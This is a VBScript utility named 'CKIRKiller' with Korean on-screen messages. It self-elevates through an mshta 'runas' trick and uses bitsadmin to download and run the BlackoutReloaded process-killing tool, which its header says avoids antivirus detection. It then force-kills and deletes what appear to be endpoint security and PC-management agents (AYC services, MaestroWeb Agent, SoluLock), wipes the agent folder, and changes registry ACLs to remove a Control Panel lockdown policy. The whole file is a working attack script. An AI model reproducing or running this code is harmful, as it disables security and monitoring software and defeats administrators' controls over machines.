' ============================================================
'  CKIRKiller - VBScript
'  Download via bitsadmin (no ADODB.Stream - avoids AV flag)
'  Double-click to run. No cmd or PowerShell required.
'
'  Order:
'    1. Install Git
'    2. Download BlackoutReloaded.exe
'    3. Kill wave 1 targets + resolve path via WMI + delete files
'    4. Kill wave 2 targets + delete files + clear folder
' ============================================================

Option Explicit

Dim oShell, oFSO, oWMI
Set oShell = CreateObject("WScript.Shell")
Set oFSO   = CreateObject("Scripting.FileSystemObject")
Set oWMI   = GetObject("winmgmts:{impersonationLevel=impersonate}!\\.\root\cimv2")

Const GitPath     = "C:\Program Files\Git"
Const BlackoutExe = "C:\Program Files\Git\BlackoutReloaded.exe"
Const GitInstaller= "C:\Windows\Temp\Git-Installer.exe"
Const BlackoutTmp = "C:\Windows\Temp\BlackoutReloaded.exe"
Const MaestroDir  = "C:\Program Files (x86)\Solusseum\MaestroWeb Agent"
Const GitURL      = "https://github.com/git-for-windows/git/releases/download/v2.53.0.windows.2/Git-2.53.0.2-64-bit.exe"
Const BlackoutURL = "https://github.com/tijme/blackout-reloaded/raw/master/BlackoutReloaded.exe"

' ── Admin check ─────────────────────────────────────────────
Dim sTestFile : sTestFile = "C:\Windows\System32\_admintest_.tmp"
Dim bAdmin : bAdmin = False
On Error Resume Next
Dim oTest : Set oTest = oFSO.CreateTextFile(sTestFile, True)
If Err.Number = 0 Then
    bAdmin = True
    oTest.Close
    oFSO.DeleteFile sTestFile, True
End If
On Error GoTo 0

If Not bAdmin Then
    Dim sScript : sScript = WScript.ScriptFullName
    oShell.Run "mshta vbscript:Execute(""CreateObject(""""Shell.Application"""").ShellExecute """"wscript.exe"""","""""""""  & sScript & """"""""",,""""runas"""",1:close"")", 0, False
    WScript.Quit
End If

' ── Main ────────────────────────────────────────────────────
MsgBox "작업이 시작됩니다." & vbCrLf & _
       "자동적으로 각 작업이 진행되니 확인 버튼만 클릭하면 됩니다.", _
       vbInformation, "CKIRKiller"

' STEP 1: Install Git
If Not oFSO.FileExists(GitPath & "\git-bash.exe") Then
    MsgBox "1/3단계: Git 다운로드 중(시간이 다소 소요됩니다)...", vbInformation, "CKIRKiller"
    BitsDownload GitURL, GitInstaller
    MsgBox "1/3단계: Git 설치 중...", vbInformation, "CKIRKiller"
    oShell.Run """" & GitInstaller & """ /VERYSILENT /NORESTART /NOCANCEL /SP-", 0, True
End If

' STEP 2: Place BlackoutReloaded.exe
If Not oFSO.FileExists(BlackoutExe) Then
    MsgBox "2/3단계: BlackoutReloaded.exe 다운로드 중...", vbInformation, "CKIRKiller"
    BitsDownload BlackoutURL, BlackoutTmp
    oFSO.MoveFile BlackoutTmp, BlackoutExe
End If

' STEP 3: Kill wave 1 targets ? resolve path via WMI, then kill + delete
MsgBox "3/3단계: 프로세스 종료 및 제거 중...", vbInformation, "CKIRKiller"
BlackoutWithPath "qukapttp.exe"
BlackoutWithPath "nfowjxyfd.exe"
BlackoutWithPath "lqndauccd.exe"
BlackoutWithPath "rwtyijsa.exe"
BlackoutWithPath "nhfneczzm.exe"
BlackoutWithPath "AYCWSSrv.ayc"
BlackoutWithPath "AYCRTSrv.ayc"
BlackoutWithPath "AYIASrv.exe"
BlackoutWithPath "AYCUpdSrv.ayc"
BlackoutWithPath "AYCMain.ayc"
BlackoutWithPath "AYCAgent.ayc"
BlackoutWithPath "AYCRTSrv.exe"
BlackoutWithPath "AYIASrv.exe"
BlackoutWithPath "Yoondisk_hd_recv.exe"
BlackoutWithPath "yoondisk_chplayer.exe"
BlackoutAndDelete "MaestroWebSvr.exe"
BlackoutAndDelete "MaestroWebAgent.exe"
BlackoutAndDelete "SoluLock.exe"
If oFSO.FolderExists(MaestroDir) Then
    DeleteFolderContents MaestroDir
End If

' --- STEP 4: Force Reset Language List (PowerShell Integration) ---
MsgBox "한컴 입력기 제거 제어판 활성화 중...", vbInformation, "CKIRKiller"

Dim psReset
psReset = "powershell -NoProfile -Command ""$List = New-WinUserLanguageList -Language 'ko-KR'; " & _
          "Set-WinUserLanguageList -LanguageList $List -Force; " & _
          "Stop-Process -Name 'ctfmon' -Force -ErrorAction SilentlyContinue; " & _
          "Remove-Item -Path 'HKCU:\Software\Microsoft\CTF\SortOrder' -Recurse -Force -ErrorAction SilentlyContinue; " & _
          "Start-Process 'ctfmon.exe'"""

oShell.Run psReset, 0, True

Dim unlockCmd
unlockCmd = "powershell -Command ""$acl = Get-Acl 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer'; $rule = New-Object System.Security.AccessControl.RegistryAccessRule ('Administrators','FullControl','Allow'); $acl.SetAccessRule($rule); Set-Acl 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer' $acl; Remove-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer' -Name 'NoControlPanel' -Force"""

oShell.Run unlockCmd, 0, True

MsgBox "작업이 완료되었습니다.", vbInformation, "CKIRKiller"

WScript.Quit

' ============================================================
'  Helpers
' ============================================================

Sub BitsDownload(sURL, sDest)
    On Error Resume Next
    oFSO.DeleteFile sDest, True
    On Error GoTo 0
    oShell.Run "bitsadmin /transfer bloatdl /download /priority foreground """ & sURL & """ """ & sDest & """", 0, True
End Sub

' Resolve the executable's full path from WMI, kill it, then delete the file
Sub BlackoutWithPath(sExe)
    Dim sFilePath : sFilePath = ""

    ' Query WMI for the running process to get its ExecutablePath
    Dim oProcs, oProc
    Set oProcs = oWMI.ExecQuery("SELECT ExecutablePath FROM Win32_Process WHERE Name='" & sExe & "'")
    For Each oProc In oProcs
        If oProc.ExecutablePath <> "" Then
            sFilePath = oProc.ExecutablePath
        End If
    Next

    ' Kill via taskkill + BlackoutReloaded (sync)
    oShell.Run "taskkill /F /IM """ & sExe & """", 0, True
    WScript.Sleep 300
    oShell.Run """" & BlackoutExe & """ " & sExe, 0, True

    ' Delete the file if we found its path
    If sFilePath <> "" Then
        On Error Resume Next
        oFSO.DeleteFile sFilePath, True
        On Error GoTo 0
    End If
End Sub

' Kill wave 2 async, delete immediately while process is dying
Sub BlackoutAndDelete(sExe)
    Dim sFilePath : sFilePath = MaestroDir & "\" & sExe

    ' Resolve actual path via WMI in case it differs
    Dim oProcs, oProc
    Set oProcs = oWMI.ExecQuery("SELECT ExecutablePath FROM Win32_Process WHERE Name='" & sExe & "'")
    For Each oProc In oProcs
        If oProc.ExecutablePath <> "" Then sFilePath = oProc.ExecutablePath
    Next

    ' Fire async ? don't wait so delete races the kill
    oShell.Run "taskkill /F /IM """ & sExe & """", 0, False
    oShell.Run """" & BlackoutExe & """ " & sExe, 0, False

    WScript.Sleep 50
    On Error Resume Next
    oFSO.DeleteFile sFilePath, True
    On Error GoTo 0

    WScript.Sleep 200
    On Error Resume Next
    oFSO.DeleteFile sFilePath, True
    On Error GoTo 0
End Sub

Sub DeleteFolderContents(sPath)
    Dim oFolder : Set oFolder = oFSO.GetFolder(sPath)
    Dim oFile, oSub
    For Each oFile In oFolder.Files
        On Error Resume Next
        oFile.Delete True
        On Error GoTo 0
    Next
    For Each oSub In oFolder.SubFolders
        On Error Resume Next
        oSub.Delete True
        On Error GoTo 0
    Next
End Sub
